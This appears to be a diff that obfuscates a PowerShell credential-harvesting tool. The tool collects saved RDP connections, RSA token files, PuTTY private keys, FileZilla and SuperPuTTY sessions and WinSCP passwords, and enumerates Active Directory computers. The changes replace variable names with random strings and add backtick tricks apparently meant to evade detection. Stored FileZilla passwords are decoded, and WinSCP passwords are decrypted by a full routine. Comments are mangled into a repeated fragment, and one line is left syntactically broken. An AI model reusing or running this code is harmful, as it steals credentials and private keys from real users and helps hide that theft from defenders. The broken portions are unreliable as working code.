+  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF
 
 } # Microsoft".
 
-function ProcesssdtidFile($RoyalClaim) {
+function ProcesssdtidFile($OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ) {
 
-  foreach ($Path in $RoyalClaim.VersionInfo.FileName) {
+  foreach ($Path in $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ.VersionInfo.FileName) {
 
-    $ReachRipe = "" | Select-Object -Property "Source","Path"
+    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF = "" | Select-Object -Property "Source","Path"
 
-    $ReachRipe."Source" = $EndClassy
-    $ReachRipe."Path" = $Path
+    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF."Source" = $BMsqhbcZYwkwfMupnghp
+    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF."Path" = $Path
 
-    [void]$ShopSnow.Add($ReachRipe)
+    [void]$ROkBCNKdDchnbbrBbYFwJJ.Add($siFYcXvgZXvqnezNoNLuSPILDVqWVwF)
 
   }
 
-  if ($ShopSnow.count -gt 0) {
+  if ($ROkBCNKdDchnbbrBbYFwJJ.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "sdtid Files" -CanvasStingy $ShopSnow
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "sdtid Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ROkBCNKdDchnbbrBbYFwJJ
 
-    if ($BedChunky) {
-      $ShopSnow | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\RSA sdtid Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $ROkBCNKdDchnbbrBbYFwJJ | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -NoTypeInformation
     } else {
       Write-Output "RSA Tokens (sdtid)"
-      $ShopSnow | Select-Object * | Format-List | Out-String
+      $ROkBCNKdDchnbbrBbYFwJJ | Select-Object * | Format-List | Out-String
     }
 
   }
 
 } # Microsoft".
 
-function ProcessRDPFile($IslandCruel) {
+function ProcessRDPFile($skJFGTkoRQFyjrkRqfHA) {
   
   # Microsoft".
-  foreach ($Path in $IslandCruel.VersionInfo.FileName) {
+  foreach ($Path in $skJFGTkoRQFyjrkRqfHA.VersionInfo.FileName) {
     
-    $LoudFrail = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
+    $WXqDceOEICanOnclBfEuImAqvR = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
 
-    $LoudFrail."Source" = (Hostname)
+    $WXqDceOEICanOnclBfEuImAqvR."Source" = (Hostname)
 
     # Microsoft".
-    $LoudFrail."Path" = $Path 
-    $LoudFrail."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $LoudFrail."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $LoudFrail."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $LoudFrail."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
+    $WXqDceOEICanOnclBfEuImAqvR."Path" = $Path 
+    $WXqDceOEICanOnclBfEuImAqvR."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
+    $WXqDceOEICanOnclBfEuImAqvR."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
+    $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
+    $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
 
-    if (!$LoudFrail."Administrative Session" -or !$LoudFrail."Administrative Session" -eq 0) {
-      $LoudFrail."Administrative Session" = "Does not connect to admin session on remote host"
+    if (!$WXqDceOEICanOnclBfEuImAqvR."Administrative Session" -or !$WXqDceOEICanOnclBfEuImAqvR."Administrative Session" -eq 0) {
+      $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = "Does not connect to admin session on remote host"
     } else {
-      $LoudFrail."Administrative Session" = "Connects to admin session on remote host"
+      $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = "Connects to admin session on remote host"
     }
-    if (!$LoudFrail."Prompts for Credentials" -or $LoudFrail."Prompts for Credentials" -eq 0) {
-      $LoudFrail."Prompts for Credentials" = "No"
+    if (!$WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" -or $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" -eq 0) {
+      $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = "No"
     } else {
-      $LoudFrail."Prompts for Credentials" = "Yes"
+      $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = "Yes"
     }
 
-    [void]$JumpySmash.Add($LoudFrail)
+    [void]$ALyYGPldjWMXbilDGXXuwzTiScIOh.Add($WXqDceOEICanOnclBfEuImAqvR)
 
   }
 
-  if ($JumpySmash.count -gt 0) {
+  if ($ALyYGPldjWMXbilDGXXuwzTiScIOh.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Files" -CanvasStingy $JumpySmash
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh
 
-    if ($BedChunky) {
-      $JumpySmash | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\Microsoft rdp Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -NoTypeInformation
     } else {
       Write-Output "Microsoft RDP Connection Files (.rdp)"
-      $JumpySmash | Select-Object * | Format-List | Out-String
+      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Select-Object * | Format-List | Out-String
     }
 
   }
 
 } # Microsoft".
 
-function ProcessPPKFile($MaidMice) {
+function ProcessPPKFile($vLCzqZfXfTRAtutlzMndAJztthLCt) {
 
   # Microsoft".
-  foreach ($Path in $MaidMice.VersionInfo.FileName) {
+  foreach ($Path in $vLCzqZfXfTRAtutlzMndAJztthLCt.VersionInfo.FileName) {
 
     # Microsoft".
-    $TwoRagged = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"
+    $LWMRzhYReweJfHeHvrZbeaqGE = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"
 
-    $TwoRagged."Source" = (Hostname)
-
-    # Microsoft".
-    $TwoRagged."Path" = $Path
-
-    $TwoRagged."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
-    $TwoRagged."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
-    $TwoRagged."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
-    $KettleEasy = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
-    $TwoRagged."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$KettleEasy).Context.PostContext -Join "" } catch {}
-    $TwoRagged."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}
+    $LWMRzhYReweJfHeHvrZbeaqGE."Source" = (Hostname)
 
     # Microsoft".
-    [void]$DreamExpect.Add($TwoRagged)
+    $LWMRzhYReweJfHeHvrZbeaqGE."Path" = $Path
+
+    $LWMRzhYReweJfHeHvrZbeaqGE."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
+    $LWMRzhYReweJfHeHvrZbeaqGE."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
+    $LWMRzhYReweJfHeHvrZbeaqGE."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
+    $whYQKtTARRiHtwRZgjfzPkSweWwNgjFYcYQLNDVUhivvN = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
+    $LWMRzhYReweJfHeHvrZbeaqGE."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$whYQKtTARRiHtwRZgjfzPkSweWwNgjFYcYQLNDVUhivvN).Context.PostContext -Join "" } catch {}
+    $LWMRzhYReweJfHeHvrZbeaqGE."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}
+
+    # Microsoft".
+    [void]$vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.Add($LWMRzhYReweJfHeHvrZbeaqGE)
 
   }
 
-  if ($DreamExpect.count -gt 0) {
+  if ($vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.count -gt 0) {
 
-    $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PPK Files" -CanvasStingy $DreamExpect
+    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PPK Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio
 
-    if ($BedChunky) {
-      $DreamExpect | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY ppk Files.csv") -NoTypeInformation
+    if ($nFdMHRmJUTihVghjwpEMqoB) {
+      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -NoTypeInformation
     } else {
       Write-Output "PuTTY Private Key Files (.ppk)"
-      $DreamExpect | Select-Object * | Format-List | Out-String
+      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Select-Object * | Format-List | Out-String
     }
 
   }
@@ -732,7 +732,7 @@ function ProcessFileZillaFile($FileZillaXML) {
       # Microsoft".
       $FileZillaSession.ChildNodes | ForEach-Object {
 
-          $FileZillaSessionHash["Source"] = $EndClassy
+          $FileZillaSessionHash["Source"] = $BMsqhbcZYwkwfMupnghp
           # Microsoft".
           if ($_.InnerText) {
               if ($_.Name -eq "Pass") {
@@ -747,71 +747,71 @@ function ProcessFileZillaFile($FileZillaXML) {
       }
 
     # Microsoft".
-    [void]$JadedCent.Add((new`-ob`je`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "# Microsoft".
+    [void]$cTWMuhzRBpgLjOdAEBuayABpY.Add((ne`w`-`ob`je`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "# Microsoft".
      
   } # Microsoft".
   
   # Microsoft".
-  foreach ($IdeaPedal in $JadedCent) {
-      $IdeaPedal.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($IdeaPedal.Password))
-      if ($IdeaPedal.Protocol -eq "0") {
-        $IdeaPedal.Protocol = "Use FTP over TLS if available"
-      } elseif ($IdeaPedal.Protocol -eq 1) {
-        $IdeaPedal.Protocol = "Use SFTP"
-      } elseif ($IdeaPedal.Protocol -eq 3) {
-        $IdeaPedal.Protocol = "Require implicit FTP over TLS"
-      } elseif ($IdeaPedal.Protocol -eq 4) {
-        $IdeaPedal.Protocol = "Require explicit FTP over TLS"
-      } elseif ($IdeaPedal.Protocol -eq 6) {
-        $IdeaPedal.Protocol = "Only use plain FTP (insecure)"
+  foreach ($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $cTWMuhzRBpgLjOdAEBuayABpY) {
+      $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Password))
+      if ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq "0") {
+        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Use FTP over TLS if available"
+      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 1) {
+        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Use SFTP"
+      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 3) {
+        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Require implicit FTP over TLS"
+      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 4) {
+        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Require explicit FTP over TLS"
+      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 6) {
+        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Only use plain FTP (insecure)"
       } 
   }
 
-  if ($BedChunky) {
-    $JadedCent | Export-CSV -Append -Path ($AdviseRacial + "\FileZilla.csv") -NoTypeInformation
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $cTWMuhzRBpgLjOdAEBuayABpY | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\FileZilla.csv") -NoTypeInformation
   } else {
     Write-Output "FileZilla Sessions"
-    $JadedCent | Format-List | Out-String
+    $cTWMuhzRBpgLjOdAEBuayABpY | Format-List | Out-String
   }
 
   # Microsoft".
-  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -CanvasStingy $JadedCent
+  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $cTWMuhzRBpgLjOdAEBuayABpY
 
 } # Microsoft".
 
-function ProcessSuperPuTTYFile($ReturnMarket) {
+function ProcessSuperPuTTYFile($xSUZWiIFWzdJkYAJQeScDzPWnccWPMi) {
 
-  foreach($ScaredRing in $ReturnMarket.ArrayOfSessionData.SessionData) {
+  foreach($ZoAeqEXTgmGBHKNxaPPbOgnK in $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi.ArrayOfSessionData.SessionData) {
 
-    foreach ($SkipScorch in $ScaredRing) { 
-      if ($SkipScorch -ne $null) {
+    foreach ($AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot in $ZoAeqEXTgmGBHKNxaPPbOgnK) { 
+      if ($AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot -ne $null) {
 
-        $HeatJudge = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
 
-        $HeatJudge."Source" = $EndClassy
-        $HeatJudge."SessionId" = $SkipScorch.SessionId
-        $HeatJudge."SessionName" = $SkipScorch.SessionName
-        $HeatJudge."Host" = $SkipScorch.Host
-        $HeatJudge."Username" = $SkipScorch.Username
-        $HeatJudge."ExtraArgs" = $SkipScorch.ExtraArgs
-        $HeatJudge."Port" = $SkipScorch.Port
-        $HeatJudge."PuTTY Session" = $SkipScorch.PuttySession
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Source" = $BMsqhbcZYwkwfMupnghp
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."SessionId" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.SessionId
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."SessionName" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.SessionName
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Host" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Host
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Username" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Username
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."ExtraArgs" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.ExtraArgs
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Port" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Port
+        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."PuTTY Session" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.PuttySession
 
-        [void]$NuttyAunt.Add($HeatJudge)
+        [void]$bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY.Add($JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg)
       } 
     }
 
   } # Microsoft".
 
-  if ($BedChunky) {
-    $NuttyAunt | Export-CSV -Append -Path ($AdviseRacial + "\SuperPuTTY.csv") -NoTypeInformation
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\SuperPuTTY.csv") -NoTypeInformation
   } else {
     Write-Output "SuperPuTTY Sessions"
-    $NuttyAunt | Out-String
+    $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY | Out-String
   }
 
   # Microsoft".
-  $BabiesCaring | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -CanvasStingy $NuttyAunt
+  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY
 
 } # Microsoft".
 
@@ -824,71 +824,71 @@ function ProcessSuperPuTTYFile($ReturnMarket) {
 # Microsoft".
 function GetComputersFromActiveDirectory {
 
-  $ThingsMeat = "computer"
-  $MouthGaudy = new`-ob`je`ct System.DirectoryServices.DirectoryEntry
-  $MarketDogs = new`-ob`je`ct System.DirectoryServices.DirectorySearcher
-  $MarketDogs.SearchRoot = $MouthGaudy
-  $MarketDogs.Filter = ("(objectCategory=$ThingsMeat)")
+  $wmzNfMEjOpeoWDQkxJDXcNEkb = "computer"
+  $wlqyguoGbshdmwDvBzLXdNBNSlRpEunqI = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry
+  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher
+  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.SearchRoot = $wlqyguoGbshdmwDvBzLXdNBNSlRpEunqI
+  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.Filter = ("(objectCategory=$wmzNfMEjOpeoWDQkxJDXcNEkb)")
 
-  $HeapMoon = "name"
+  $LoDyYWKcMPvtkHqzZQVycmH = "name"
 
-  foreach ($ChiefQuick in $HeapMoon){$MarketDogs.PropertiesToLoad.Add($ChiefQuick)}
+  foreach ($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB in $LoDyYWKcMPvtkHqzZQVycmH){$BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.PropertiesToLoad.Add($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB)}
 
-  return $MarketDogs.FindAll()
-
-}
-
-function DecryptNextCharacterWinSCP($DoubleNoise) {
-
-  # Microsoft".
-  $PhobicWave = "" | Select-Object -Property flag,remainingPass
-
-  # Microsoft".
-  $LovelyMist = ("0123456789ABCDEF".indexOf($DoubleNoise[0]) * 16)
-  $ShapeThings = "0123456789ABCDEF".indexOf($DoubleNoise[1])
-
-  $RoseNotice = $LovelyMist + $ShapeThings
-
-  $BranchFamous = (((-bnot ($RoseNotice -bxor $NeedleZip)) % 256) + 256) % 256
-
-  $PhobicWave.flag = $BranchFamous
-  $PhobicWave.remainingPass = $DoubleNoise.Substring(2)
-
-  return $PhobicWave
+  return $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.FindAll()
 
 }
 
-function DecryptWinSCPPassword($FuzzyTested, $StiffDry, $PastShake) {
+function DecryptNextCharacterWinSCP($KmVVznheIoYeNIpCKrKGB) {
 
-  $SpringAbject = 255
-  $NeedleZip = 163
+  # Microsoft".
+  $PRZaizlQkUpzJtbxkiNHnBq = "" | Select-Object -Property flag,remainingPass
 
-  $HeadyWarn = 0
-  $FuelSudden =  $FuzzyTested + $StiffDry
-  $VeilFlower = DecryptNextCharacterWinSCP($PastShake)
+  # Microsoft".
+  $CftzolxiaTvewpYOwFcnmFUOM = ("0123456789ABCDEF".indexOf($KmVVznheIoYeNIpCKrKGB[0]) * 16)
+  $GhoXaDkxaizTwheQnxeNpnYIUMHjKgzRnKhMfVXw = "0123456789ABCDEF".indexOf($KmVVznheIoYeNIpCKrKGB[1])
 
-  $BrickMisty = $VeilFlower.flag 
+  $eWDyaAbCsmbMCQqdkCftUFHNHVSQxvuursjjSzCG = $CftzolxiaTvewpYOwFcnmFUOM + $GhoXaDkxaizTwheQnxeNpnYIUMHjKgzRnKhMfVXw
 
-  if ($VeilFlower.flag -eq $SpringAbject) {
-    $VeilFlower.remainingPass = $VeilFlower.remainingPass.Substring(2)
-    $VeilFlower = DecryptNextCharacterWinSCP($VeilFlower.remainingPass)
+  $oYCDTFjjZtOYSwlIdWZDZKIya = (((-bnot ($eWDyaAbCsmbMCQqdkCftUFHNHVSQxvuursjjSzCG -bxor $NwtyKsIWYgNpJaxgjzNuEEySZProptMvhByLjrqUPqLQh)) % 256) + 256) % 256
+
+  $PRZaizlQkUpzJtbxkiNHnBq.flag = $oYCDTFjjZtOYSwlIdWZDZKIya
+  $PRZaizlQkUpzJtbxkiNHnBq.remainingPass = $KmVVznheIoYeNIpCKrKGB.Substring(2)
+
+  return $PRZaizlQkUpzJtbxkiNHnBq
+
+}
+
+function DecryptWinSCPPassword($BjXqGlysvPulWtXjHANsQcPjf, $RXvafiJLcKyQUqvcDhnUDJOnISJmZvJzSDPDIoWhicQm, $XssJWKNYEUORVeOpxpTFwFu) {
+
+  $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI = 255
+  $NwtyKsIWYgNpJaxgjzNuEEySZProptMvhByLjrqUPqLQh = 163
+
+  $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh = 0
+  $xADyGlHiIQVUrJgxGSXjJHPObHBmiKWrjAKFtuHM =  $BjXqGlysvPulWtXjHANsQcPjf + $RXvafiJLcKyQUqvcDhnUDJOnISJmZvJzSDPDIoWhicQm
+  $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($XssJWKNYEUORVeOpxpTFwFu)
+
+  $lFlqOowtxSqfXzobxsUrRXwmXZjXAxCXyUxDTTmuucr = $LSKnMueepExhzlzaygoEcRax.flag 
+
+  if ($LSKnMueepExhzlzaygoEcRax.flag -eq $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI) {
+    $LSKnMueepExhzlzaygoEcRax.remainingPass = $LSKnMueepExhzlzaygoEcRax.remainingPass.Substring(2)
+    $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass)
   }
 
-  $HeadyWarn = $VeilFlower.flag
+  $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh = $LSKnMueepExhzlzaygoEcRax.flag
 
-  $VeilFlower = DecryptNextCharacterWinSCP($VeilFlower.remainingPass)
-  $VeilFlower.remainingPass = $VeilFlower.remainingPass.Substring(($VeilFlower.flag * 2))
+  $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass)
+  $LSKnMueepExhzlzaygoEcRax.remainingPass = $LSKnMueepExhzlzaygoEcRax.remainingPass.Substring(($LSKnMueepExhzlzaygoEcRax.flag * 2))
 
-  $MendWord = ""
-  for ($ChiefQuick=0; $ChiefQuick -lt $HeadyWarn; $ChiefQuick++) {
-    $VeilFlower = (DecryptNextCharacterWinSCP($VeilFlower.remainingPass))
-    $MendWord += [char]$VeilFlower.flag
+  $PdQXYlSDgcHDgfbDoCppJPYnD = ""
+  for ($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB=0; $siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB -lt $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh; $siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB++) {
+    $LSKnMueepExhzlzaygoEcRax = (DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass))
+    $PdQXYlSDgcHDgfbDoCppJPYnD += [char]$LSKnMueepExhzlzaygoEcRax.flag
   }
 
-  if ($BrickMisty -eq $SpringAbject) {
-    return $MendWord.Substring($FuelSudden.length)
+  if ($lFlqOowtxSqfXzobxsUrRXwmXZjXAxCXyUxDTTmuucr -eq $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI) {
+    return $PdQXYlSDgcHDgfbDoCppJPYnD.Substring($xADyGlHiIQVUrJgxGSXjJHPObHBmiKWrjAKFtuHM.length)
   }
 
-  return $MendWord
+  return $PdQXYlSDgcHDgfbDoCppJPYnD
 
 }
